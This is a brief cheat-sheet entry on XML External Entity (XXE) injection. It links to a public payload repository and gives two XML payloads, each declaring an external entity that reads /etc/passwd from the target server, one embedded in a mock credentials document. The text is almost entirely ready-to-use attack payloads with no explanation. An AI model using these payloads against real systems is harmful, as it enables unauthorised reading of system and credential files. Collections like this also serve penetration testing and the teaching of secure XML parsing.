**XML External Entity (XXE) Injection**

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">]>
<data>&file;</data>
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<creds><user>&xxe;</user><password>pass</password></creds>
```